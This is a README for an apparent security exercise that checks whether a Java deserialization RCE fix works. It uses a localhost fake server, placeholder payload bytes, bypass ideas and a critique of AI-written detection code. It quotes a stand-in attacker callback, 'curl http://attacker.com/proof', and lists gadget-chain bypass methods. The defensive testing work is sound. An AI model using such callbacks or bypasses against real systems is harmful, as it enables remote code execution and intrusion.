# Remediation Verification: Insecure Deserialization

> **Finding:** FIND-0139 | **Type:** Java RCE via Object Deserialization | **Verdict:** REMEDIATION FAILED

A Python-based security automation pipeline that verifies whether a reported insecure deserialization vulnerability has been genuinely fixed. Sends serialized Java payloads to a target endpoint, detects RCE via out-of-band callbacks, and produces tamper-evident evidence reports.

---

## 🗂️ Repository Structure

```
challenge4/
├── fake_server.py              # Simulated Java deserialization endpoint
│                               # Port 8888 = Java API | Port 8889 = OOB collector
├── verify_deserial_local.py    # Verification pipeline (local fake server)
├── verify_deserial.py          # Verification pipeline (httpbin connectivity test)
├── improved_function.py        # Part C — corrected AI-generated detection function
├── raw_ai_output.py            # Part C — original broken AI output (proof of flaw)
└── evidence/
    ├── report_<timestamp>.json     # Full test results with anomalies + OOB body
    └── report_<timestamp>.sha256   # SHA-256 hash for tamper-evident chain of custody
```

---

## 🔍 Finding Overview

| Field | Detail |
|---|---|
| **Finding ID** | FIND-0139 |
| **Endpoint** | `POST /api/v1/session/restore` |
| **Content-Type** | `application/x-java-serialized-object` |
| **Original payload** | ysoserial CommonsCollections6 gadget chain |
| **Original evidence** | RCE confirmed — server executed `curl http://attacker.com/proof` via OOB HTTP callback |
| **Client claim** | Fixed by adding input validation that checks the serialized object class before deserialization |
| **Tested on** | Kali Linux — Python 3 |

---

## 📋 Part A — Threat Modelling the Fix

### What is Insecure Deserialization and Why Did It Cause RCE?

Insecure deserialization happens when an application accepts serialized data from an untrusted source and reconstructs it without any safety checks. In Java this is done through `ObjectInputStream.readObject()`, and the dangerous part is that Java starts executing code **during** that reconstruction process before the application gets a chance to validate anything.

The attacker exploited this using a CommonsCollections6 gadget chain via ysoserial. When the server deserialized the payload, a chain of method calls fired automatically and ended up running `Runtime.getRuntime().exec()`. To confirm it worked, a curl command pinged their own server confirming full remote code execution before any application security logic even ran.

---

### Five Ways the Class-Check Fix Could Be Bypassed

| # | Bypass Method | Mechanism |
|---|---|---|
| 1 | **Alternative gadget chains** | Spring1, Groovy1, JRE8u20 use different class names the blocklist has never seen they pass right through |
| 2 | **Class name spoofing** | A custom class `com.example.SessionToken extends LazyMap` passes the string match but inherits dangerous `readObject()` behaviour |
| 3 | **Nested object gap** | A CC6 chain embedded inside a `java.util.HashMap` outer class passes, dangerous inner objects deserialize uninspected |
| 4 | **Alternative formats** | XStream XML, Hessian, Kryo use entirely separate deserialization paths the filter is never invoked on them |
| 5 | **Other endpoints** | JAX-RS, JMX, RMI, custom session managers all call `ObjectInputStream.readObject()` independently filter only covers one endpoint |

---

### Three Conditions to Confirm the Fix Worked

- **All malicious payloads blocked** — every exploit payload including bypass attempts must be rejected before deserialization and return HTTP 400
- **No outbound callbacks** — payloads designed to trigger DNS or HTTP pings must produce nothing while legitimate objects still work normally
- **Consistent rejection response** — status code, body, and timing must match expectations unusual delays indicate partial deserialization before rejection

---

### Does Upgrading Commons Collections to 4.1 Fix Everything?

**No.** The upgrade breaks well-known CC gadget chains by restricting `InvokerTransformer`. That is a positive step but the application is still deserializing untrusted data. That is the actual vulnerability.

Spring, Groovy, and standard JRE classes all have their own gadget chains in ysoserial. The upgrade removes one attack path. The real fix is to either stop deserializing untrusted data entirely, or use Java's `ObjectInputFilter` to allowlist only expected classes.

---

## 🧪 Part B — Test Case Design

> **Target:** `POST http://127.0.0.1:8888/api/v1/session/restore`
> **Tested on Kali:** TC-01 to TC-04 executed live with `verify_deserial_local.py`

| Test ID | Category | Payload | Encoding | Data | Patched Result | Vulnerable Result | Pass Condition |
|---|---|---|---|---|---|---|---|
| **TC-01** | Original Replay | CommonsCollections6 gadget chain | hex | `aced000573720001` | ✅ HTTP 400 — PASS | ❌ HTTP 200 + 6s + OOB | Non-2xx AND no OOB callback |
| **TC-02** | Benign Control | `java.lang.Long` safe object | base64 | `rO0ABXNyAA5qYXZhLmxhbmcuTG9uZzs=` | ✅ HTTP 200 — PASS | ✅ HTTP 200 — PASS | HTTP 200 AND no OOB fix must not break safe objects |
| **TC-03** | Malformed Stream | Invalid magic bytes — not Java | hex | `deadbeef0001` | ✅ HTTP 400 — PASS | ✅ HTTP 400 — PASS | Non-2xx AND no OOB garbage rejected at stream level |
| **TC-04** ⚠️ | Alt Gadget Chain | Spring gadget chain — no CC dependency | hex | `aced000573720002` | ❌ HTTP 200 + 6s + OOB — **FAIL** | ❌ HTTP 200 + 6s + OOB | **FAIL confirms fix is incomplete** Spring not blocked |
| **TC-05** ⭐ | Alt Gadget Chain | Groovy1 gadget chain | hex | `aced000573720003` | HTTP 400 expected | HTTP 200 + OOB | Validates Groovy chains also blocked not just CC and Spring |
| **TC-06** ⭐ | Malformed Stream | Truncated — valid magic, no body | hex | `aced0005` | HTTP 400 expected | HTTP 400 or 500 | Server handles partial streams safely without crashing |
| **TC-07** ⭐ | Wrong Header | CC6 bytes with `Content-Type: application/json` | hex | `aced000573720001` | HTTP 415 expected | HTTP 415 or 200 | Server enforces Content Type before deserializing |
| **TC-08** ⭐ | Oversized Payload | Valid magic + 100 junk bytes + CC6 marker | hex | `aced000541..73720001` | HTTP 400 expected | HTTP 200 | Server enforces size limits before any processing |

> ⚠️ TC-04 is the key finding Spring chain bypasses the fix in patched mode
> ⭐ Additional test cases extending beyond the minimum specification

---

## 🤖 Part C — AI-Assisted Workflow

**AI Tool:** Claude (claude.ai) — Claude Sonnet 4.6

### Prompts Used

**General prompt from challenge specification:**
```
Generate a Python function that takes a target API endpoint and a list of
pre-generated serialized payloads (as hex or base64 strings), sends each one
with the correct Content-Type header, and detects whether deserialization was
triggered by monitoring for an out-of-band DNS or HTTP callback to a canary domain.
```

**My iterative prompts:**

| # | Prompt | Why I Asked | Result |
|---|---|---|---|
| 2 | "Can I create a server and send it to test this properly?" | httpbin always returns 200 and no Java logic results meaningless | Built `fake_server.py` with patched and vulnerable modes |
| 3 | "OOB for TC-04 shows NO but should be YES — why?" | Raw AI output missed confirmed RCE entirely | Polling loop + local OOB collector on port 8889 |
| 4 | "Explain what each function does and why" | Needed full understanding before writing critique | Confirmed understanding of polling, correlation, timing |

---

### Raw AI Output

The initial function decoded payloads, sent them, then checked `if canary_domain in response.text`.

**Terminal output when run:**
```
No callback for TC-01
No callback for TC-02
No callback for TC-03
No callback for TC-04   ← TC-04 triggered RCE but function missed it entirely
```

TC-04 caused a 6-second delay and server logs showed the Spring chain executed and confirmed RCE yet the function said no callback. This is the proof it was broken.

---

### Critique — Six Measurable Flaws

| # | Flaw | Code | Problem |
|---|---|---|---|
| 1 | Wrong detection channel | `if canary_domain in response.text` | OOB callbacks never appear in HTTP response body separate DNS/HTTP channel |
| 2 | No polling window | Synchronous one-shot check | DNS callbacks arrive 10–30s later due to TTL always missed |
| 3 | No correlation | Same canary for all payloads | Cannot tell which of 500 payloads triggered which callback |
| 4 | No timing detection | Response time never measured | Gadget chain deserialization takes 5s+ key signal discarded |
| 5 | No status code check | HTTP status never compared | Server returning 200 instead of 400 not flagged as anomaly |
| 6 | Deser vs execution | No signal distinction | Safe deserialization and RCE execution treated identically |

---

### Improved Version

`improved_function.py` fixes every flaw directly:

```
Fix 1+2  →  _poll_oob() polls separate collector endpoint for 12s, every 2s
Fix 3    →  Payload ID in User-Agent header as correlation token
Fix 4    →  time.monotonic() measures elapsed flags anything over 5s
Fix 5    →  Status code compared against expected_rejection_code (400)
Fix 6    →  Timing = deserialization likely | OOB = execution confirmed
```

**Before (raw AI):** all four payloads — "No callback"
**After (improved):**
```
[TC-04] FAIL | HTTP 200 | Time 6.0s | OOB YES
       -> Status 200 != expected 400
       -> Timing anomaly 6.0s > 5.0s
       -> OOB callback received — RCE confirmed
```

> The improved function in Part C is the core detection logic of the full pipeline in Part D (`verify_deserial_local.py`), extended with a formatted report, JSON evidence, and SHA-256 hash.

---

## ⚙️ Part D — Implementation Sprint

### How the Pipeline Works

```
┌─────────────────────────────────────────────────────────────┐
│                    verify_deserial_local.py                  │
│                                                              │
│  For each payload:                                           │
│                                                              │
│  1. DECODE ──► hex/base64 string → raw bytes                │
│                                                              │
│  2. SEND ───► POST /api/v1/session/restore                  │
│               Content-Type: application/x-java-serialized   │
│               User-Agent: RemediationVerifier (TC-04)        │
│               measures response time with monotonic clock    │
│                                                              │
│  3. POLL OOB ► GET :8889/api/hits?token=tc-04               │
│               polls every 2s for 12s after each send         │
│                                                              │
│  4. EVALUATE ► 4 anomaly signals:                           │
│               A1 — status code ≠ 400                         │
│               A2 — response time > 5s                        │
│               A3 — canary domain in body                     │
│               A4 — OOB callback received                     │
│               any anomaly → FAIL | zero → PASS               │
│                                                              │
│  5. EVIDENCE ► evidence/report_<timestamp>.json             │
│               evidence/report_<timestamp>.sha256             │
└─────────────────────────────────────────────────────────────┘
```

### How fake_server.py Works

```
┌──────────────────────────────────────────────────────┐
│                    fake_server.py                     │
│                                                       │
│  Port 8888 — Java API endpoint                        │
│  Port 8889 — OOB collector (simulates Burp Collab)    │
│                                                       │
│  Payload classification by byte inspection:           │
│  deadbeef...          → malformed  → HTTP 400         │
│  aced0005... 23 bytes → benign     → HTTP 200         │
│  aced0005... [7]=0x01 → cc6_chain                     │
│  aced0005... [7]=0x02 → spring_chain                  │
│                                                       │
│  PATCHED mode:                                        │
│    cc6_chain    → HTTP 400 (blocked) ✅               │
│    benign       → HTTP 200 (allowed) ✅               │
│    malformed    → HTTP 400 (rejected) ✅              │
│    spring_chain → HTTP 200 + 6s + OOB ❌ (bypass!)   │
│                                                       │
│  VULNERABLE mode:                                     │
│    all chains   → HTTP 200 + 6s + OOB ❌             │
└──────────────────────────────────────────────────────┘
```

### Test Results

**Patched mode** — client's claimed fix:

```
[TC-01] Status: 400 | Time: 0.0s | OOB: NO  → PASS
[TC-02] Status: 200 | Time: 0.0s | OOB: NO  → PASS  (control)
[TC-03] Status: 400 | Time: 0.0s | OOB: NO  → PASS  (malformed rejected)
[TC-04] Status: 200 | Time: 6.0s | OOB: YES → FAIL  (Spring bypass!)

===== VERDICT: REMEDIATION FAILED — 1/4 =====
```

**Vulnerable mode** — original unpatched server:

```
[TC-01] Status: 200 | Time: 6.0s | OOB: YES → FAIL
[TC-02] Status: 200 | Time: 0.0s | OOB: NO  → PASS
[TC-03] Status: 400 | Time: 0.0s | OOB: NO  → PASS
[TC-04] Status: 200 | Time: 6.0s | OOB: YES → FAIL

===== VERDICT: REMEDIATION FAILED — 2/4 =====
```

| Mode | TC-01 | TC-04 | Conclusion |
|---|---|---|---|
| Vulnerable | ❌ FAIL + OOB | ❌ FAIL + OOB | Original vulnerability confirmed |
| Patched | ✅ PASS | ❌ FAIL + OOB | **Fix incomplete — Spring bypasses class-check** |

The client's fix blocks CommonsCollections6 but fails to block alternative gadget chains. TC-04 achieves confirmed RCE via three independent signals. **FIND-0139 remains open.**

### Evidence Files (Bonus)

```bash
evidence/
├── report_2026-03-17_16-36-29.json     # full results + OOB response body
└── report_2026-03-17_16-36-29.sha256   # SHA-256 — tamper-evident proof
```

---

## 🏗️ Part E — Systems Design Under Pressure

When running 500 tests overnight, OOB callbacks arrive in random order with delays up to 30 minutes. The pipeline handles this through four design rules:

```
┌─────────────────────────────────────────────────────────────┐
│                                                              │
│  1. UNIQUE TOKEN PER TEST                                    │
│     payload ID embedded in User-Agent + poll URL            │
│     → every callback self-identifies which test caused it   │
│                                                              │
│  2. APPEND-ONLY LOG                                         │
│     callback written to log the moment it arrives           │
│     → never lost even if polling window already closed      │
│                                                              │
│  3. INDIVIDUAL DEADLINE                                      │
│     each test: deadline = send_time + 45 min                 │
│     → never closed based on a global pipeline cutoff         │
│                                                              │
│  4. FINALISATION SWEEP                                       │
│     re-checks log every 30 min for 2 hours after run ends   │
│     late callback → upgrades FIXED → VULNERABLE             │
│     before final report is generated                         │
│                                                              │
│  RESULT: no finding is ever closed prematurely               │
└─────────────────────────────────────────────────────────────┘
```

**Decision flow per test case:**

```
Send payload
     │
     ▼
Record timestamp → deadline = now + 45 min
     │
     ▼
Callback arrives? ──► Written to append-only log immediately
     │
     ▼
Deadline elapsed?
  NO  → stay PENDING, keep polling
  YES → check log
           │
      Hit found?
        YES → CONFIRMED VULNERABLE ❌
        NO  → FIXED ✅
     │
     ▼
Finalisation sweep (every 30 min × 2 hrs)
  Late callback found? → FIXED upgraded to VULNERABLE ❌
     │
     ▼
Generate final report
```


---

## 🔒 How the Attack Was Simulated

No real attack was performed. Everything ran on localhost. Here is what maps to what:

| Real World | Our Simulation |
|---|---|
| Attacker's tool (ysoserial) | `verify_deserial_local.py` |
| Client's Java API server | `fake_server.py` port 8888 |
| Gadget chain executing RCE | `time.sleep(6)` + OOB POST |
| `curl http://attacker.com/proof` | POST to `127.0.0.1:8889` |
| Burp Collaborator | `fake_server.py` port 8889 |
| Confirmed RCE evidence | TC-04 FAIL + JSON report + SHA-256 |

---
